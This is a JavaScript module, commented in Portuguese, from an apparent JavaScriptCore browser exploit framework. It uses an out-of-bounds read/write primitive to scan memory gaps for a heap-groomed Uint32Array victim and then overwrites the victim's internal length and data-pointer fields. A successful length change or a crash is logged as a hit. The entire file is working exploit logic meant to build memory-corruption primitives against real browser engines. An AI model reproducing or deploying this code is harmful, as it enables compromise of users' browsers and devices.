// js/victim_corruptor.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs'; // Para Groomer.victim_object
import { JSC_OFFSETS } from './config.mjs'; // Importa os offsets ATUALIZADOS

let _CURRENT_TEST_GAP = 0;
let _last_successful_gap = null;
const FNAME_BASE = "VictimCorruptor";

// Getters e Setters para as variáveis de estado do módulo
export function getCurrentTestGap() { return _CURRENT_TEST_GAP; }
export function setCurrentTestGap(value) { _CURRENT_TEST_GAP = value; }
export function getLastSuccessfulGap() { return _last_successful_gap; }
export function setLastSuccessfulGap(value) { _last_successful_gap = value; }
export function resetLastSuccessfulGap() { _last_successful_gap = null; }


async function checkVictimObjectProperties(expectedLength = null, expectedByteLength = null) {
    const FNAME_CHECK = `${FNAME_BASE}.checkVictim`;
    if (!Groomer.victim_object) {
        log("   checkVictim: Objeto vítima não definido.", "warn", FNAME_CHECK);
        return { length_ok: false, bytelength_ok: false, vector_ok: false };
    }
    if (!(Groomer.victim_object instanceof Uint32Array)) { // Adapte se usar outros tipos de vítima
        log("   checkVictim: Objeto vítima não é Uint32Array. Verificação de propriedades não implementada para este tipo.", "warn", FNAME_CHECK);
        return { length_ok: false, bytelength_ok: false, vector_ok: false };
    }

    let length_ok = true;
    let bytelength_ok = true;

    if (expectedLength !== null && Groomer.victim_object.length !== expectedLength) {
        log(`   [CHECK-FAIL] Comprimento da vítima: ${Groomer.victim_object.length}, Esperado: ${expectedLength}`, "error", FNAME_CHECK);
        length_ok = false;
    } else if (expectedLength !== null) {
        log(`   [CHECK-OK] Comprimento da vítima: ${Groomer.victim_object.length}`, "good", FNAME_CHECK);
    }

    if (expectedByteLength !== null && Groomer.victim_object.byteLength !== expectedByteLength) {
        log(`   [CHECK-FAIL] ByteLength da vítima: ${Groomer.victim_object.byteLength}, Esperado: ${expectedByteLength}`, "error", FNAME_CHECK);
        bytelength_ok = false;
    } else if (expectedByteLength !== null) {
        log(`   [CHECK-OK] ByteLength da vítima: ${Groomer.victim_object.byteLength}`, "good", FNAME_CHECK);
    }
    // Não podemos verificar m_vector diretamente de forma fácil sem addrof
    return { length_ok, bytelength_ok, vector_ok: true /* placeholder */ };
}


export async function try_corrupt_fields_for_gap(current_gap_to_test) {
    const FNAME_TRY_FIELDS = `${FNAME_BASE}.try_corrupt_fields`;
    log(`--- Tentando corromper campos para GAP: ${current_gap_to_test} (${toHexS1(current_gap_to_test)}) ---`, 'subtest', FNAME_TRY_FIELDS);

    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) {
        log("   ERRO: Primitiva OOB não está ativa. Abortando.", 'error', FNAME_TRY_FIELDS);
        return { success: false, error: "OOB_INACTIVE" };
    }
    if (!Groomer.victim_object) {
        log("   AVISO: Objeto vítima (Groomer.victim_object) não está preparado. A corrupção pode não ser verificável.", 'warn', FNAME_TRY_FIELDS);
    }

    const original_victim_length = Groomer.victim_object ? Groomer.victim_object.length : -1;
    const original_victim_byte_length = Groomer.victim_object ? Groomer.victim_object.byteLength : -1;

    // Offsets dos campos da vítima RELATIVOS ao início do objeto vítima.
    // O 'current_gap_to_test' é o offset do início do buffer OOB até o início do objeto vítima.
    const victim_base_offset_in_oob = current_gap_to_test;

    const m_vector_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
    const m_length_field_offset_in_oob = victim_base_offset_in_oob + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;

    const new_m_length_val = 0x100000; // Um valor grande para tentar causar OOB access na vítima
    const new_m_vector_val_low = 0x42424242; // Valor de teste para o ponteiro
    const new_m_vector_val_high = 0x41414141;
    const new_m_vector_int64 = new AdvancedInt64(new_m_vector_val_low, new_m_vector_val_high); // "AABBBBBBCCCCCCCC"

    let success_flag = false;
    let error_type = null;
    let details = {};

    try {
        log(`   Lendo m_vector original em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
        const original_m_vector = Core.oob_read_relative(m_vector_field_offset_in_oob, 8); // Lê 64 bits
        details.original_m_vector = original_m_vector ? original_m_vector.toString(true) : "ERRO_LEITURA";
        log(`     Valor original m_vector (no GAP): ${details.original_m_vector}`, 'leak', FNAME_TRY_FIELDS);

        log(`   Lendo m_length original em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
        const original_m_length = Core.oob_read_relative(m_length_field_offset_in_oob, 4); // Lê 32 bits
        details.original_m_length = toHexS1(original_m_length);
        log(`     Valor original m_length (no GAP): ${details.original_m_length}`, 'leak', FNAME_TRY_FIELDS);

        // Tentar corromper m_length
        log(`   Escrevendo novo m_length (${toHexS1(new_m_length_val)}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_length_field_offset_in_oob, new_m_length_val, 4);
        details.written_m_length = toHexS1(new_m_length_val);

        // Tentar corromper m_vector
        log(`   Escrevendo novo m_vector (${new_m_vector_int64.toString(true)}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'vuln', FNAME_TRY_FIELDS);
        Core.oob_write_relative(m_vector_field_offset_in_oob, new_m_vector_int64, 8);
        details.written_m_vector = new_m_vector_int64.toString(true);

        log("   Corrupção tentada. Verificando o objeto vítima (se existir)...", 'info', FNAME_TRY_FIELDS);
        await PAUSE_LAB(50); // Dá um tempo para o motor JS processar, se necessário

        if (Groomer.victim_object) {
            log(`     Comprimento original JS da vítima: ${original_victim_length} (${toHexS1(original_victim_length)})`, "info", FNAME_TRY_FIELDS);
            log(`     Comprimento ATUAL JS da vítima: ${Groomer.victim_object.length} (${toHexS1(Groomer.victim_object.length)})`, "analysis", FNAME_TRY_FIELDS);

            if (Groomer.victim_object.length === new_m_length_val) {
                log("     SUCESSO! Comprimento do objeto vítima foi alterado para o valor escrito!", "good", FNAME_TRY_FIELDS);
                success_flag = true;
                setLastSuccessfulGap(current_gap_to_test); // GAP é bom para m_length
                error_type = "LENGTH_CORRUPTED_SUCCESS";
            } else {
                 log("     AVISO: Comprimento do objeto vítima NÃO corresponde ao valor escrito.", "warn", FNAME_TRY_FIELDS);
            }
            // Teste de acesso para ver se causa crash ou comportamento estranho
            try {
                // Acessar um índice alto baseado no novo comprimento (corrompido)
                // Se m_length foi corrompido para ser maior, isso pode ler OOB do buffer original da vítima
                // Se m_vector foi corrompido, isso pode ler de um endereço arbitrário.
                const high_victim_index = Math.min(new_m_length_val - 1, original_victim_length + 10); // Lê um pouco além do original
                log(`     Tentando ler Groomer.victim_object[${toHexS1(high_victim_index)}]...`, "info", FNAME_TRY_FIELDS);
                const val = Groomer.victim_object[high_victim_index];
                log(`       Valor lido: ${toHexS1(val)}`, "leak", FNAME_TRY_FIELDS);
                // Se chegou aqui sem crash e m_length foi alterado, é um bom sinal.
            } catch (e_access) {
                log(`     EXCEÇÃO ao acessar vítima após corrupção: ${e_access.message}`, "error", FNAME_TRY_FIELDS);
                log("     Esta exceção PODE indicar sucesso na corrupção (ex: segmentation fault simulado).", "vuln", FNAME_TRY_FIELDS);
                success_flag = true; // Crash/exceção é frequentemente o objetivo aqui
                setLastSuccessfulGap(current_gap_to_test);
                error_type = e_access.name || "VICTIM_ACCESS_EXCEPTION";
            }
        } else {
            log("   Nenhum objeto vítima para verificar. Sucesso da corrupção não pode ser diretamente confirmado via JS.", "warn", FNAME_TRY_FIELDS);
            // Sem vítima, consideramos sucesso se não houver erro na escrita OOB
            success_flag = true;
            error_type = "NO_VICTIM_CHECK";
        }

        // Restaurar (tentativa) - pode não ser possível se o estado estiver muito corrompido
        if (details.original_m_length !== undefined && details.original_m_length !== "ERRO_LEITURA") {
            log(`   Restaurando m_length original (${details.original_m_length}) em offset OOB: ${toHexS1(m_length_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_length_field_offset_in_oob, parseInt(details.original_m_length,16), 4);
        }
        if (details.original_m_vector !== undefined && details.original_m_vector !== "ERRO_LEITURA") {
            log(`   Restaurando m_vector original (${details.original_m_vector}) em offset OOB: ${toHexS1(m_vector_field_offset_in_oob)}`, 'info', FNAME_TRY_FIELDS);
            Core.oob_write_relative(m_vector_field_offset_in_oob, new AdvancedInt64(details.original_m_vector), 8);
        }


    } catch (e_oob) {
        log(`   ERRO FATAL durante operações OOB para GAP ${current_gap_to_test}: ${e_oob.message}`, 'error', FNAME_TRY_FIELDS);
        success_flag = true; // Erro de OOB (ex: crash real ao escrever) também indica que o GAP atingiu algo sensível
        setLastSuccessfulGap(current_gap_to_test);
        error_type = e_oob.name || "OOB_OPERATION_EXCEPTION";
        if (e_oob.message.includes("fora dos limites do buffer real")) {
             log(`     Este GAP (${toHexS1(current_gap_to_test)}) parece estar fora dos limites do buffer OOB principal.`, 'warn', FNAME_TRY_FIELDS);
             return { success: false, error: "GAP_OUT_OF_BOUNDS", details }; // Não é um GAP útil se estiver fora do buffer que podemos realmente escrever.
        }
    }
    log(`--- Tentativa de corrupção para GAP ${current_gap_to_test} concluída. Sucesso: ${success_flag}, Erro: ${error_type} ---`, success_flag ? 'good' : 'warn', FNAME_TRY_FIELDS);
    return { success: success_flag, error: error_type, details };
}


export async function findAndCorruptVictimFields_Iterative(gapStart, gapEnd, gapStep, victimSize) {
    const FNAME = `${FNAME_BASE}.findAndCorruptIterative`;
    log(`--- Iniciando Busca Iterativa de GAP & Corrupção ---`, "test", FNAME);
    log(`   Range de GAP: ${gapStart} (${toHexS1(gapStart)}) a ${gapEnd} (${toHexS1(gapEnd)}), Passo: ${gapStep}`, "info", FNAME);
    log(`   Tamanho da Vítima Esperado (para grooming): ${victimSize}`, "info", FNAME);

    resetLastSuccessfulGap(); // Limpa o último GAP de sucesso

    if (!Core.oob_array_buffer_real && gapEnd > 0) { // Se gapEnd for 0 ou negativo, pode ser um teste sem OOB real
        log("   AVISO: Primitiva OOB não parece estar ativa. Ativando...", "warn", FNAME);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Falha ao ativar primitiva OOB. Abortando busca.", "error", FNAME);
            return;
        }
    }
    
    // Preparar vítima (uma vez no início da busca)
    if (Groomer.victim_object == null && victimSize > 0) { // Só prepara se não houver uma já ou se o tamanho for válido
        log("   Preparando objeto vítima para a busca...", "info", FNAME);
        await Groomer.prepareVictim(victimSize);
        if (!Groomer.victim_object) {
            log("   ERRO: Falha ao preparar objeto vítima. A verificação da corrupção será limitada.", "error", FNAME);
            // Continuar mesmo assim? Ou abortar? Por enquanto, continua mas avisa.
        }
    } else if (victimSize <= 0) {
         log("   AVISO: Tamanho da vítima inválido. Não será possível preparar/verificar Groomer.victim_object.", "warn", FNAME);
    }


    for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
        setCurrentTestGap(current_gap);
        log(`Testando GAP atual: ${current_gap} (${toHexS1(current_gap)})`, "info", FNAME);
        // Atualiza UI se existir o elemento
        const currentGapUIEl = document.getElementById('current_gap_display');
        if (currentGapUIEl) currentGapUIEl.textContent = `${current_gap} / ${toHexS1(current_gap)}`;

        const result = await try_corrupt_fields_for_gap(current_gap);

        if (result.success) {
            log(`   GAP PROMISSOR ENCONTRADO: ${current_gap} (${toHexS1(current_gap)})! Tipo de Erro/Sucesso: ${result.error}`, "vuln", FNAME);
            log(`     Detalhes: m_vec_orig: ${result.details?.original_m_vector}, m_len_orig: ${result.details?.original_m_length}`, "leak", FNAME);
            // Se getLastSuccessfulGap foi setado, a iteração pode parar ou continuar dependendo da estratégia
            // Por enquanto, vamos parar no primeiro GAP que causa um "sucesso" (crash/exceção/mudança de length)
            log("   Parando busca no primeiro GAP promissor.", "info", FNAME);
            break; 
        }

        await PAUSE_LAB(100); // Pausa entre tentativas de GAP
        if (document.hidden) { log("Busca abortada, página não visível.", "warn", FNAME); break; }
         // Lógica para garantir que o último GAP seja testado se o passo não o atingir exatamente
        if (current_gap < gapEnd && (current_gap + gapStep) > gapEnd && (current_gap + gapStep) !== gapEnd ) {
            current_gap = gapEnd - gapStep; // Prepara para que a próxima iteração seja o último passo
        }
    }

    if (getLastSuccessfulGap() !== null) {
        log(`Busca iterativa concluída. GAP DE SUCESSO IDENTIFICADO: ${getLastSuccessfulGap()} (${toHexS1(getLastSuccessfulGap())})`, "good", FNAME);
        log("   Este GAP provavelmente permitiu corromper campos da vítima ou atingiu memória sensível.", "vuln", FNAME);
    } else {
         log("Busca iterativa concluída. Nenhum GAP causou um crash/exceção óbvia ou mudança de length verificável.", "warn", FNAME);
    }
    setCurrentTestGap(0); // Reseta
    const currentGapUIEl = document.getElementById('current_gap_display');
    if (currentGapUIEl) currentGapUIEl.textContent = "-";
}

export async function testCorruptKnownGap() {
    const FNAME_TCKG = `${FNAME_BASE}.testCorruptKnownGap`;
    const gapInputEl = document.getElementById('gap_to_test_input'); // Use um ID específico
    let gapToTest;

    if (gapInputEl && gapInputEl.value !== "") {
        gapToTest = parseInt(gapInputEl.value);
        if (isNaN(gapToTest)) {
            log(`Valor do GAP no input '${gapInputEl.value}' é inválido. Tentando usar último GAP de sucesso.`, "warn", FNAME_TCKG);
            gapToTest = getLastSuccessfulGap();
        }
    } else {
        gapToTest = getLastSuccessfulGap();
    }
    
    if (gapToTest === null || isNaN(gapToTest)) {
        log("Nenhum GAP válido conhecido ou fornecido para testar.", "error", FNAME_TCKG);
        return;
    }

    log(`Testando corrupção no GAP: ${gapToTest} (${toHexS1(gapToTest)})`, "test", FNAME_TCKG);
    await try_corrupt_fields_for_gap(gapToTest);
}
